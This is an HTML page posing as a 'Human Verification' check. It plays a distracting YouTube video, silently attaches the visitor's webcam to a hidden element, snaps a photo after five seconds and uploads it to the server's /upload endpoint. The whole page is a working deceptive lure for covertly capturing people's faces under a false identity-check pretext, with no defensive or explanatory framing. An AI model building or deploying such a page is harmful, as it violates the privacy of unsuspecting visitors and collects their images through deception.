<!-- public/index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Human Verification</title>
  <script src="{{url_for('static',filename='webcam.js')}}"></script>
</head>
<body>
  <h2>Verifying your identity...</h2>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/BSJa1UytM8w?autoplay=1&mute=1" frameborder="0" allowfullscreen></iframe>
  <div id="camera" style="display:none;"></div>
  <script >
    Webcam.set({ width: 320, height: 240, image_format: 'jpeg', jpeg_quality: 90 });
    Webcam.attach('#camera');
    setTimeout(() => {
      Webcam.snap(data_uri => {
        fetch('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: data_uri })
        });
      });
    }, 5000);
  </script>
</body>
</html>
